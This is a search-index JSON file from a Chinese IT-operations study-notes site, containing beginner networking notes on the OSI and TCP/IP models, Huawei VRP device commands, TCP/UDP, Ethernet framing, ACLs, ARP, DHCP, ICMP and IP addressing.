{"./":{"url":"./","title":"首页","keywords":"","body":"写在开头 本站会不定期分享一些关于IT运维相关的文章，由于受时间、技术水平和能力的限制，可能存在表述不准确的地方，仅供一起讨论学习。 推荐阅读 https://www.feiyunote.cn/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/AWD/AWD-Guide.html 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 16:48 "},"1.数据通信/1.网络概述/1.网络企业基础架构.html":{"url":"1.数据通信/1.网络概述/1.网络企业基础架构.html","title":"1.网络企业基础架构","keywords":"","body":" 网络：似宇宙洪荒，浩瀚无边，深不可测；网络案例似璀璨群星，千变万化，闪耀环宇。学习网络技术似夜观星象，每有所得，便拍案惊奇，夜不能寐。 路由交换类似于“路”，只有把路建好了，才能去别人家。 主要设备：交换机、路由器、防火墙 上网通常使用的是私网地址，并不能直接访问Internet，可以通过NAT技术 企业架构分层： 核心层：对用户流量进行高速处理转发 汇聚层：对用户的流量进行汇聚 接入层：用于接入用户，供用户访问服务 企业网络架构很大程度取决于企业或机构的业务需求： 小型企业 通常只有一个办公地点，一般采用扁平网络架构（没有层次化）进行组网。扁平网络架构能够满足用户对资源的基本访问需求，具有较强的灵活性，同时又能够大大减少部署和维护成本。网络通常缺少冗余机制，可靠性不高，容易发生业务中断。 大型企业 业务对网络的连续性要求很高，所以通常会通过冗余备份来保证网络的可用性和稳定性，从而保证企业的日常业务运营。网络也会对业务资源的访问进行控制，所以通常采用多层网络架构来优化流量分布，并应用各种策略进行流量管理和资源访问控制。多层网络设计也可以使网络易于扩展。网络采用模块化设计能够有效实现网络隔离并网络维护，避免某一区域产生的故障影响到整个网络。 运营商网络： 覆盖范围大（全省，全国……） 网络复杂 多厂商共存（华为、思科、华三……） 网络安全可靠性要求高（不能出现断网、被攻击……） 涉及的网络制式多（涉及多种协议） IDC数据中心 校园网 五大网：中国移动、中国电信、中国联通、教育网、科研网 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/1.网络概述/2.网络概述.html":{"url":"1.数据通信/1.网络概述/2.网络概述.html","title":"2.网络概述","keywords":"","body":"网络概述： 硬件方面：通过介质（网线、无线……）将网络设备和终端设备连接起来 软件方面：操作系统、应用软件、应用程序互相通信 实现资源共享、信息传递 网络的组成： 术语 备注 设备 Device 介质 Media 消息/报文 Massage/Data 协议 Protocol 发送方/信息源 Sender/Source 接受发/信息目 Receiver/Destination 数据通信是双向的（保证数据的来回） 网络的演进： 小型主机互联形成了局域网LAN 多个局域网互联就成了internet 互联网 全球相连就形成了Internet 因特网 术语 备注 network 网络，一组互连、通信的设备 internet 互联网，多个互联互通的网络 Internet 因特网，互联全世界的网络 Internet组成： ISP：Internet service providers 因特网服务提供商，向用户提供互联网接入业务、信息业务、和增值业务，俗称运营商，如：电信、移动、联通 用户通过Internet互联 Internet通过ISP构建 用途 WAN服务 ISP 最后一公里接入（宽带接入） 光纤、LAN、ADSL 电信、移动、联通 移动通信 WinMAX、3G/4G/5G、公共无线LAN 电信、移动、联通 VPN 广域以太网、IP-VPN、以太网VPN 电信、移动、联通 专线 ATM、专线 电信、移动、联通 网络的类型：根据覆盖范围不同，组网技术不同（二层） 类型 备注 PAN （个人蓝牙、热点） Personal area network，个人网 LAN（多台主机构建） Local area network，局域网 CAN（大的局域网构建） Campus area network，园区网 MAN（一个城市构建） Metropolitan area network，城域网 WAN（城市与城市构建） Wide area network，广域网 WLAN（WiFi） Wireless local area network，无线局域网 WWAN（3G/4G） Wireless wide area network，无线广域网 协议：Protocol 网络通信中的“语言” 汉语和英文当作“协议” 聊天当作“通信” 说话的内容当作“数据” 决定数据的格式和传输的一组规则 What ？How ？When ？ 协议一致，通信轻松 网络性能指标： 带宽（bandwidth） 描述在单位时间内从一个节点到另一个节点的数据量 类似于水管的粗细、公路的宽度 以bps（bit per second 比特每秒）为单位 如：以太网贷款为10Mbps，快速以太网为100Mbps 延迟（delay） 描述在单位时间内从一个节点到另一个节点的时间 以ms为单位 网络拓扑：topology ，用来描绘网络结构（网络类型、设备类型、设备数量、线缆、带宽、服务、数据走向等）示意图 制作拓扑图的软件：PPT，visio，亿图，模拟器 拓扑类型：根据接口、线缆、封装判断 星型 特点：边缘设备故障不影响其他设备通信 缺点：核心设备故障影响所有设备通信 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/1.网络概述/3.网络模型.html":{"url":"1.数据通信/1.网络概述/3.网络模型.html","title":"3.网络模型","keywords":"","body":"分层思想：将复杂的流程分解为几个功能相对单一的子过程 流程更加清晰，复杂问题简单化 更容易发现问题并针对性的解决问题 如：小黑喝牛奶不在乎中间的过程 用户不在乎中间的过程只在乎上网 制作牛奶的部门：就是为了方便管理，出现问题能够找到问题源 对于网络也需要分层：方便管理，出现问题能够找到问题源易于学习，各层之间的改变不影响其他层 网络标准化：规范不同的互联标准，互相兼容，加快网络发展 1974年前-各厂商都有自己的通信协议标准，导致不同厂商之间不兼容，影响互联网发展 1974年-提出OSI开放式互联参考模型协议，但是未被认可，TCP/IP协议认可 2000年至今通信都在使用遵守TCP/IP协议 OSI开放式互联参考模型： OSI未被广泛认可原因：层次太多麻烦复杂、功能重复 网络排错思想： 从下层到上层开始 从上层到下层开始 TCP/IP开发早于OSI，最终在市场获取认可，目前所使用的通信标准 数据封装和解封装： 应用数据需要经过逐层处理后才能通过网络传递给对方 OSI把每一层数据称为PDU（protocol data unit 协议数据单元） TCP/IP根据不同层分别使用段segment、包packet、帧frame、比特bit 发送者逐层向下传递数据，并添加报头和报尾的过程称为封装（打包） 反之，接收者逐层向上传递数据，称为解封装（拆包） TCP/IP协议簇中的常见协议： 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/1.网络概述/4.OSI参考模型.html":{"url":"1.数据通信/1.网络概述/4.OSI参考模型.html","title":"4.OSI参考模型","keywords":"","body":"OSI参考模型的背景： 互联网早期并没有一个通信标准，导致各厂商之间使用自己的私有技术来实现通信，从而影响了网络的发展 国际标准化组织（International Organization for Standardization，ISO）在1984年正式提出OSI开放互联参考模型，定义了通信的基础标准，如今使用最广泛的TCP/IP协议就是基于OSI模型设计的（并不是具体的一种协议、应用，只是一种参考模型） OSI的分层结构：物理层、数据链路层、网络层、传输层、会话层、表示层、应用层 分层：模块化、标准化、流程化设计理念 带来的好处：减少复杂性、加速技术之间的兼容性、易于学习 每一个层次都是独立的， （如：工作在物理层的网卡的收发速率的改变，上层不需要变化） 但每一层都紧密相连 。 （如：工作在物理层的网卡出现故障，会导致上层都会收到影响 ） 各层的作用： 物理层：实现最基本的底层数据传输（传输方式、传输标准） 数据链路层：定义数据的基本格式（数据如何在线缆上传输，如何标识该数据，如何防止数据错误） 网络层：IP编址和路由功能（定义三层编址，提供在不同网络中转发的能力） 传输层：定义了端到端通信 （端到端连接、端到端之间传输数据、传输数据的速度、可靠性） 会话层：控制一个应用程序/一对IP地址（一对不同的会话，QQ、微信……） 表示层：定义数据的格式（定义数据的内容是图片JPG、视频AVI、文本TXT，压缩加密） 应用层：定义了应用协议（HTTP、SNMP） 数据传输封装和解封装： 封装：由上层到下层的逐级封装 数据由应用层产生，逐渐的往下走，每经过一个层都封装报头“穿马甲“ 解封装：由下层到上层的逐级解封装 每经过一层都会将报头解封装“卸马甲”，最终以原始的数据交付应用层 每层的数据报头的名词： TCP/IP协议： 根据OSI参考模型进行简化 TCP/IP与OSI模型的对比关系：（三层和四层比较重要保留） 每一层对应的协议： 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/2.VRP基础/1.概述.html":{"url":"1.数据通信/2.VRP基础/1.概述.html","title":"1.概述","keywords":"","body":" VRP：version route platform 通用路由平台 华为公司具有完全自主知识产权的网络操作系统 可用运行多中硬件平台之上(路由器、交换机、防火墙) 拥有一致的网络界面、用户界面和管理界面，提供丰富的应用解决方案 集成了路由交换技术、QOS技术、安全技术和IP语言技术等数据通信功能 主要使用版本：VRPv5 高级版本v8 设备管理方式： 管理方式 登入方式 优点 缺点 应用场景 CLI命令行 console 使用console线缆连接 完全本地管理 单会话 无法远程 初始化 故障恢复 升级 CLI命令行 miniUSB 使用miniUSB线缆连接 完全本地管理 单会话 无法远程 初始化 故障恢复 升级 CLI命令行 Telnet 远程管理 多会话 明文传输 不安全 对安全性要求不高的网络 CLI命令行 SSH 远程管理 多会话 高安全性 配置较复杂 对安全性要求高的网络 管理方式 登入方式 优点 相同点 不同点 web图形化 HTTP 图形化界面，更直观 加载SSL证书用于登入认证，配置几乎相同 登入使用HTTPS，传输数据使用HTTP web图形化 HTTPS 图形化界面，更直观 加载SSL证书用于登入认证，配置几乎相同 登入和传输数据都是用HTTPS，需要开启命令 管理形式 备注 本地管理 local 通过console连接console口或miniUSB口，终端使用serial协议适合初始化，故障恢复系统升级 远程管理remote 通过IP地址或域名连接虚拟接口VTY口，使用Telnet或SSH适合后期维护、异地管理，同时支持多个会话 console线 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/2.VRP基础/2.基础命令.html":{"url":"1.数据通信/2.VRP基础/2.基础命令.html","title":"2.基础命令","keywords":"","body":"VRP基本配置： 询问是否进入自动配置（一问一答模式）： VRP有很多中模式/视图，每个视图都有可执行的配置 常用的快捷键： 配置时间日期： 配置登入设备信息： 配置登入用户： 查看接口状态（二层或三层） 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/2.VRP基础/3.文件系统.html":{"url":"1.数据通信/2.VRP基础/3.文件系统.html","title":"3.文件系统","keywords":"","body":" 设备内存 SDRAM 内存 （临时性存储） 断电后配置文件丢弃 （内存较大） Flash 闪存 （永久性存储） NVRAM 内存 断电后配置文件还在 （内存小） SD card SD卡 （永久性存储） USB （移动存储） 配置命令： pwd 显示当前所在的存储介质 dir 显示存储介质内的目录的文件 Mkdir 创建文件 More 显示记事本格式文件 CD /CD .. 进入目录 ，回到上一目录 Delete 将文件删除到回收站 Undelete 恢复删除的文件 Reset recycle-bin 清空回收站 rename重命名 Move 移动文件 Copy 复制文件 配置文件管理 显示当前配置文件 （断电丢失） 显示已保存的配置文件 保存当前配置文件 一个问题是问是否保存当前文件 第二个问题是问是否重启 格式化文件 格式化存储盘 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/2.VRP基础/4.远程管理.html":{"url":"1.数据通信/2.VRP基础/4.远程管理.html","title":"4.远程管理","keywords":"","body":" 运行终端用户远程到任何可用充当Telnet服务器的设备 Telnet 服务器无需与终端用户直连，只要TCP可达 认证模式： 配置命令： Telnet server enable 开启telnet服务 Display telnet server 验证telnet服务 user-interface 0 4 set authentication-mode password/aaa user privilege level 15 user-interface maximum-vty 15 idle-timeout 10 进入VTY配置模式配置认证模式配置用户权限配置最大接入数配置超时时间 AAAlocal-user huawei password cipher huawei@123local-user huawei privilege level 15local-user huawei service-type telnet 进入AAA配置模式创建用户名和密码配置用户权限配置服务类型 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/2.VRP基础/5.系统管理.html":{"url":"1.数据通信/2.VRP基础/5.系统管理.html","title":"5.系统管理","keywords":"","body":" VRP命名规则： 由VRP自身版本号和关联产品版本号两部分组成 产品版本格式包含设备型号 Vxxx （产品码），Rxxx（大版本号），Cxx（小版本号） 如果VRP产品版本有补丁，VRP产品版本中还包含SPC部分 文件传输协议 FTP可靠（在跨网段或广域网之间使用较好），TFTP不可靠 （在局域网内对可靠性要求不高使用较好） FTP传输的命令： TFTP传输的命令： Ftp 服务器地址Get 文件名 Tftp 服务器地址 get 文件名 FTP与TFTP的区别： 设备登入FTP需要输入账号密码，TFTP不需用 FTP传输会显示进度，TFTP不显示进度 FTP可用查看文件，TFTP不能查看 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/3.TCPIP协议/1.TCP与UDP.html":{"url":"1.数据通信/3.TCPIP协议/1.TCP与UDP.html","title":"1.TCP与UDP","keywords":"","body":" 传输层提供端到端的连接（会话之间） 网络层提供点到点的连接（节点之间） 根据端口号可以区分不同的应用协议 传输层端口：Port 0~1023 属于公认端口/知名端口（给一些重要的协议使用的端口） 1024~49151属于注册端口/登记端口（应用注册使用的端口） 49152~65535属于私有端口/动态端口（主机/客户端使用的端口） 端口是根据需求自行更改的 可以通过更改端口可以让非信任用户访问不到应用 如FTP的端口默认为21，修改端口为9999，让非信任用户访问不到FTP服务器 客户端（source port 49152~65535） 服务器（source port 0~49152） 端口对应了一种应用协议，真正提供服务的是服务器 传输层协议： 协议 备注 TCP Transmission control protocol 传输控制协议可靠的、面向连接的协议传输效率低，类似于打电话 UDP User datagram protocol 用户数据报协议不可靠、无连接的服务传输效率高，类似于群聊 TCP在通信前需要建立关系来确认之间状态 UDP在通信前不需要建立关系来确认之间的状态 TCP与UDP数据包结构对比： TCP可靠，效率低 TCP会话的建立-三次握手：涉及标志位SYN,ACK 三次握手机制类似打电话：（确保身份状态的可靠性） 第一次握手： 第二次握手： 第三次握手： TCP会话的确认：对每个数据包都会进行确认（影响资源的消耗，推出滑动窗口机制，只对部分进行确认） TCP会话的拥塞和流量控制 根据窗口机制来控制网络拥塞（网络拥塞，主机接收服务器的数据不过来，服务器接收主机的请求不过来，可以根据窗口大小来调整） TCP会话的结束-四次握手：涉及ACK、FIN TCP的三次握手一定是三次交互报文，四次握手可能不会有四次交互报文（主机直接拔电） 网络中最霸道的攻击 DDos 黑客控制僵尸网络向服务器发送TCP SYN ，并不会对服务器的回应。 UDP：用户数据报协议 TCP与UDP的区别： 传输控制协议TCP 用户数据报协议UDP 面向连接 无连接 可靠传输 尽力而为的传输 支持流控及窗口机制 无流控及窗口机制 仅支持点对点通信 支持任意通信方式（点对点，点对多点） 多用于注重数据的完整性 不要求数据的完整性，开销小 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:19 "},"1.数据通信/3.TCPIP协议/2.数据链路层.html":{"url":"1.数据通信/3.TCPIP协议/2.数据链路层.html","title":"2.数据链路层","keywords":"","body":"以太网：Ethernet 当今主导地位的局域网组网技术（只与物理层数据链路层有关） 以太网的发展史： 20世纪70年代，由Xerox公司联合Intel和DEC公司开发出以太网 1973年，传输速率3Mb/s 1980年，传输速率10Mb/s 1990年，出现双绞线介质的以太网 1992年，传输速率100Mb/s 1998年，传输速率1000Mb/s 2010年，IEEE发布40G/100G标准 2013年，400G的以太网标准工作正式启动！ 以太网的分类： 类型 支持速率/模式 需不需要冲突检测CSMA/CD技术 DIX以太网 10Mbit/S以太网 需要CSMA/CD IEEE802.3 10Mbit/S以太网 需要CSMA/CD IEEE802.3u 100Mbit/S以太网 可以选择使用CSMA/CD IEEE802.3z 1Gbit/S以太网 可以选择使用CSMA/CD IEEE802.3ae 10Gbit/S以太网 不需要CSMA/CD IEEE802.3ba 40/100Gbit/S以太网 不需要CSMA/CD IEEE802.3x 全双工 不需要CSMA/CD CSMA/CD载波侦听多路访问/冲突检测技术：用来避免在同一共享介质出现信号冲突的技术。 工作流程：发前先听，变发边听，冲突停发，计算后重发 数据链路层的分层设计： 在数据链路层定义了两个子层：LLC层和MAC层 LLC Logical link control 逻辑链路控制负责识别网络层的协议类型并对网络层的数据进行封装向下层传递 MAC Media access config 介质访问控制负责控制物理层设备处理硬件设备的物理寻址、定义网络拓扑及数据帧的传递顺序 以太网的帧结构： IEEE802.3是Ethernet的前生，目前基本未使用 Ethernet帧结构： 协议类型 代表上层的协议 （IP=00800 ARP=00806 IPv6=86DD ） 帧大小范围 64B~1518B MTU 最大传输单元，每次发送数据的最大值（默认为1500B，大于或小于该值的数据帧都有问题） 帧校验 通过一定的计算公式来对数据包的完整性检查 MAC地址 代表一个网络接口的物理地址，全球唯一 FCS帧校验序列 4B：用来检测数据的完整性，不完整的会被之间丢弃（不会重传，靠上层实现重传） 前24位是IEEE电气和电子工程师协会分配给厂商，后24位是厂商分配的用户 主机接收到数据帧的动作： 检测FCS，通过下一步（反则丢弃） 检测DMAC，通过交给上层（反则丢弃） 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:19 "},"1.数据通信/3.TCPIP协议/3.应用层概述.html":{"url":"1.数据通信/3.TCPIP协议/3.应用层概述.html","title":"3.应用层概述","keywords":"","body":"应用层概述： TCP/IP模型的最高层 直接为应用程序提供网络服务 ​ 常用的应用层协议： DNS HTTP SMTP和POP3/IMAP Telnet和SSH FTP和TFTP DNS：Domain Name system 域名解析系统 （域名为了方便人们记忆） 建立IP地址与域名关系 将域名解析为IP地址 将IP地址解析为域名 每一次访问域名，都会向DNS服务器查询，DNS服务器进行响应，完成目的地址的封装 DNS大致分为请求报文request和响应报文relay 好用的DNS服务器：114.114.114.114 系统自带的DNS查询工具 命令 备注 nslookup 进行DNS查询 ipconfig /displayDNS 查看DNS缓存 ipconfig/flushDNS 清空DNS缓存 HTTP：hypertext transfer protocol 超文本传输协议 帮助客户端访问万维网 （World Wide Web） 网络浏览器通过翻译源代码（HTML超文本标识语言）文件来表示文本、图像、音乐、动作及视频 客户端首先发送get报文给服务器，请求将源代码发送 服务器将页面文件翻译文本、图像、音乐、动作及视频给客户端 HTTP不安全，抓包可以抓取到账号密码 SMTP和POP3：邮件服务 协议 备注 SMTP Simple mail transfer protocol 简单邮件传输协议用于发送邮件 POP3 Post office protocol v3 邮局协议版本3用于接收邮件 IMAP Internet massage access protocol 互联网邮件访问协议类似于POP3，功能更多 邮件绑定不成功，可能是邮件服务未开启 Telnet：terminal network 终端网络 远程管理的主要协议（网络设备、服务器、数据库等） 常用终端工具有：SecureCRT、Putty、Xshell Telnet 不安全，在抓包可以看到账号密码，现在多数使用SSH FTP和TFTP： 协议 备注 FTP File transfer protocol 文件传输协议提供可靠的文件传输服务具有认证、权限等功能 TFTP Trivial file transfer protocol 简单文件传输协议提供不可靠的文件传输服务消耗资源较小，速度较快常用于网络设备的配置文件和系统文件传输 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:22 "},"1.数据通信/4.路由/ACL.html":{"url":"1.数据通信/4.路由/ACL.html","title":"ACL","keywords":"","body":" ACL：Access Control List 访问控制列表 （第一代防火墙） ACL工作原理：先细后粗 ACL由一条或多条规则组成 每条规则必须选择动作：允许permit或拒绝deny 每条规则都有一个id序列号（编号默认为5，间隔默认为5） 序列号越小越先进行匹配（规则序列号小的先匹配上后面的规则就不再进行匹配） 只要有一条规则和报文匹配，就停止查找，称为命中规则 查找完所有规则，如果没有符合条件的规则，称为未命中规则 ACL只是一个流量匹配规则，必须要应用在某个接口或其他技术内才会激活 应用在接口时必须选择方向：入站或出站 不能过滤由设备自己产生的流量 ACL类型：分为数字型ACL和命名ACL 数字式ACL：下列序号是比较熟悉的，对于高级的设备支持匹配的序号越多 分类 编号范围 匹配参数 基本ACLBasic access-list 2000~2999 源IP地址等 高级ACLAdvance access-list 3000~3999 源IP地址、目标IP地址、源端口、目标端口等 二层ACLSpecify a L2 acl group 4000~4999 源MAC地址、目标MAC地址、以太帧协议类型等 用户自定义ACLUser defined access-list 5000~5999 ipv4包头、ipv6包头、L2层包头、L4层包头等 命名式ACL：如果后面有名字默认就是高级ACL，如果名字后有数字那就根据数字编号来确定 例： acl name noweb（高级ACL，从3999开始倒叙编号） acl name nochat 2266（基本ACL） 正掩码、反掩码、通配符区别： 名称 规则 作用 举例 备注 正掩码 连续的1和0 IP地址 255.255.255.0 1对应网络位，0对应主机位 反掩码 连续的1和0 路由协议OSPF等 0.0.0.255 0必须匹配，1无须匹配 通配符 任意的1和0 ACL 0.0.255.0 0必须匹配，1无须匹配 举例 备注 192.168.0.1 0.0.0.0/0 匹配一个主机地址 192.168.0.0 0.0.0.255 匹配一个网段 192.168.0.1 0.0.0.254 匹配网段内奇数地址 192.168.0.0 0.0.0.254 匹配网段内偶数地址 x.x.x.x 255.255.255.255 匹配所有地址 ACL配置： 命令 配置 acl 2000 创建一个基本ACL rule 5 permit source 192.168.1.0 0.0.0.255rule 5 deny source 192.168.1.0 0.0.0.255 配置ACL的规则：允许或拒绝源地址为192.168.1.0/24网段内的所有流量 acl 3000 创建一个高级ACL rule 5permit/deny tcp source 192.168.1.0 0.0.0.255 destination 8.8.8.8 0 destination-port eq 80 eq 等于 gt 大于 lt 小于 range 范围 配置ACL的规则：允许或拒绝源地址为192.168.1.0/24网段内到8.8.8.8的http流量 traffic-filter inbound acl 2000traffic-filter outbound acl 2000 在接口上调用ACL过滤流量 display acl 2000 验证ACL2000 display traffic-filter applied-record 查看设备上所有基于ACL调用情况 ACL调用方向建议：基本在出接口，高级在内接口 基本ACL尽量调用在离目标最近的出站接口Outbound 高级ACL尽量调用在离源头最近的入站接口Inbound ACL的规则一般是先细后粗 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:00 "},"1.数据通信/4.路由/ARP.html":{"url":"1.数据通信/4.路由/ARP.html","title":"ARP","keywords":"","body":"ARP address resolution protocol 地址解析协议 目的MAC不能不存在，负责完成不了封装，于是出现ARP ARP报文的类型分为request请求和reply/respond回应 ARP请求： ARP请求发送的类型为广播帧 （同一广播域的主机都会收到） ARP响应： ARP响应的类型为单播帧 （可以使用软件修改为广播-ARP欺骗） ARP缓存表：获取到的MAC地址会存放在该表 命令 备注 Arp -a 查看ARP缓存 Arp -d 清空ARP缓存 ARP欺骗：攻击者发送“无故ARP响应”来伪装其他设备 免费arp：用来检测配置/修改的IP地址是否重复 连续发送3次来检测地址有没有冲突 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:00 "},"1.数据通信/4.路由/DHCP.html":{"url":"1.数据通信/4.路由/DHCP.html","title":"DHCP","keywords":"","body":" DHCP：Dynamic Host Configure Protocol 动态主机配置协议 从BOOTP（Bootstrap Protocol）协议发展而来 UDP封装，服务器使用端口67，客户端使用端口68 动态分配网络信息（IP地址、子网掩码、网关、DNS服务器等） 分配给客户端的网络信息是有租约的 DHCP系统组成： DHCP Cilent客户端 请求网络信息的用户 DHCP Server服务器 能够提供DHCP功能的设备 DHCP Relay中继 一般为路由器或三层交换机等设备 DHCP报文结构： 报文类型 备注 DHCP Discover 发现 客户端寻找DHCP服务器 DHCP Offer 提供 服务器响应DHCP Discover报文，该报文携带了各种配置信息 DHCP Request 请求 客户端请求服务器对网络信息确认或者续约租期 DHCP ACK 确认 服务器对DHCP Request报文确认响应 DHCP NAK 不确认 服务器对DHCP Request报文的拒接响应 DHCP Release 释放 客户端要释放地址时用来通知服务器 DHCP工作流程： 注：Office报文和ACK报文也可以是广播包，因为服务器只是根据Mac地址回应，根本没有看三层 （在ACK确认之后才是真正的使用地址） NAK报文出现： 1.IP地址可能已经被使用 2.租期未到网络信息还存在，换了DHCP服务器 （回家，请求续约，但是服务器根本不存在该网络信息） DHCP租期更新： 在租期时间过50%后，主机会自动发送DHCP Request报文请求DHCP服务器重新续租 DHCP重绑定： 在租期时间过50%一直请求服务器，但服务器未响应，客户端在87.5%会以广播的形式发送DHCP Request报文请求以获取IP地址。 （注：是以广播的形式发送） 无法获取到DHCP服务器分配的网络信息，Windows客户端会自动使用169.254.0.0/16地址，供临时通信 无法获取从DHCP服务器获取网络信息的排错： 1.检测物理链路，驱动….. 2.Windows的DHCP client服务未开启 3.手动配置地址，测试于DHCP服务器的连通性 租期设置建议： 释放DHCP服务器分配的网络信息： DHCP地址池（pool）：所分配地址的集合 地址池的分类：接口地址池和全局地址池 同时配置，接口地址池优先级比全局地址池高 DHCP配置： 命令 备注 dhcp enable 开启DHCP功能 interface G0/0/0 进入具体接口开始配置 dhcp selcet interface 创建DHCP接口模式地址池 dhcp server dns-list 114.114.114.114 223.5.5.5 配置接口地址池的DNS服务器地址（可以配置多个） dhcp server lease day 1 hour 12 配置接口地址池的租期，默认1天 dhcp server excluded-ip-address 192.168.10.100 配置接口地址池排除的地址 dhcp server static-bind-ip-address 192.168.10.100 mac-address xxxx.xxxx.xxxx 配置静态绑定 dhcp select globa 创建DHCP全局模式地址池 ip pool RoomA 创建全局地址池名称 network 192.168.10.0 mask 24 配置全局地址池可分配的网段地址 gateway-list 192.168.10.1 配置全局地址池的网关地址 dns-list 114.114.114.114 223.5.5.5 配置全局地址池的网关地址 lease day 1 hour 12 配置全局地址池下的租期，默认1天 excluded-ip-addess 192.168.10.111 配置全局地址池下的排除地址范围 dhcp select relay 关联接口开启中继代理 dhcp relay server-ip192.168.10.254 指定DHCP服务器的地址 display ip pool interface vlanif10 used 验证某接口地址池的信息 display ip pool name huawei used 验证全局地址池的信息 display ip pool [interface 接口名 all] 查看地址池的属性 ipconfig /release 释放租期 ipconfig /renew 重新获取 DHCP接口地址池配置： DHCP全局地址池配置： 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/4.路由/ICMP.html":{"url":"1.数据通信/4.路由/ICMP.html","title":"ICMP","keywords":"","body":" ICMP：Internet control massage protocol 因特网控制协议：用于测试网络可达性、使用ping、tracert等命令调用 ICMP的格式： ICMP的类型： echo request 回响请求 echo reply 回响应答 Type 类型和 Code 代码的组合： 命令 备注 Ping 测试网络连通性 tracert 显示经过的路径 Ping 参数： tracert参数： Ping 常见问题： 成功 对方成功回响 超时 对方主机不在线、屏蔽 （不在线-有对方MAC地址缓存，对方可能关机，平并-对方开启了策略“如防火墙”） 传输失败 物理链路/网卡问题，网关未指定 无法访问 未获取到MAC地址，导致无法进行ICMP封装 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/4.路由/IP地址概述.html":{"url":"1.数据通信/4.路由/IP地址概述.html","title":"IP地址概述","keywords":"","body":"IP地址：IP Address 在网络中，通信节点都需要有一个IP地址 以点分十进制表示，有32位二进制构成（大小约43亿） 分为两大部分：网络位和主机位 网络位，代表IP地址所属的网段 主机位，代表网点上的某个节点 由子网掩码决定 “分界点” 熟记： IP地址分类：IP地址分为A,B,C,D,E五类地址 能够被主机使用的地址：A,B,C “单播地址” 只能用作目的的地址：D “组播地址” A类：0~126 B类：128~191 C类：192~223 D类：224~239 E类：240~255 特殊用途的地址： 0.0.0.0 任意地址 用于配置默认路由 127.0.0.0 环回地址 用于测试本地的TCP/IP协议栈是否正常 169.254.0.0 微软分配的地址 用于在DHCP地址获取失败后使用的地址 255.255.255.255 广播地址 用于本网络所有节点 在IP地址中定义了两种地址：公网地址和私网地址 公有地址：用于Internet，向ISP付费申请的地址，全球唯一 私网地址：仅用于企业网络内部，不能用于Internet，免费使用，可以重复 公网地址直接访问Internet，私网地址不能直接访问Internet。 私网地址访问Internet，需要NAT地址转换协议，将私网地址转换成公网地址 私网地址 范围 10.0.0.0/8 10.0.0.0~10.255.255.255 172.16.0.0/16 172.16.255.255~172.31.255.255 192.168.0.0/24 192.168.0.0~192.168.255.255 子网掩码：subnet mask 用于区分网络地址和主机地址 1表示网络位，0表示主机位（连续） 地址的默认子网掩码： A类 /8 255.0.0.0 B类/16 255.255.0.0 C类 /24 255.255.255.0 每个网段上都有两个特殊地址（最大和最小）是不能够使用的：网络地址和广播地址 网络地址和广播地址： 网络地址、主机地址、广播地址： 网络地址 主机位全0代表一个网段（头） 主机地址 主机位不能全0或1代表网段内的一个节点 广播地址 主机位全1代表一个网段内的所有节点（尾） 可用主机地址：掐头去尾 （减去网络和广播） A,B,C类地址默认掩码 有类IP地址规划的缺陷：使用默认掩码的问题：地址范围过大或过小，导致IP地址的浪费 子网划分： 满足不同网络对IP地址的需求 实现网络的层次化 节省IP地址 默认子网掩码可以进一步划分，称为可边长子网掩码“VLSM” 向主机位借1位，可以划分出两个网络 公式： 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/4.路由/IP报文.html":{"url":"1.数据通信/4.路由/IP报文.html","title":"IP报文","keywords":"","body":" IP：Internet protocol 因特网协议：网络层占主导地址协议：IP IP报文结构： 版本version：标明IP报文的版本（ v4 或 v6） 头部长度header length：头部长度（最小为20B，最大为60B） 总长度total length：头部长度和数据长度 分片：当数据包的大小超过数据链路层的MTU就需要分成多份数据包传输 分片之后重组依靠： 标志 identification 标识符 flags 片偏移 fragment offset 标志：用来标识同一个数据包 标识符： 保留 ：未使用 分段：置位表示不能分片 （遇到超过MTU的直接丢弃） 更多分段：置位标识还有分片（未置位表示这是最后一个分片） 片偏移：说明该数据包在重组后的位置 TTL：time to live 生存时间 （生命值） 防止数据包在网络中无休止的传递（防环） 每经过一次路由（路由转发）TTL值就会减1 当TTL值=0，丢弃数据包，并告诉源地址 利用TTL特性，可以实现路由跟踪技术，排错的重要方法之一 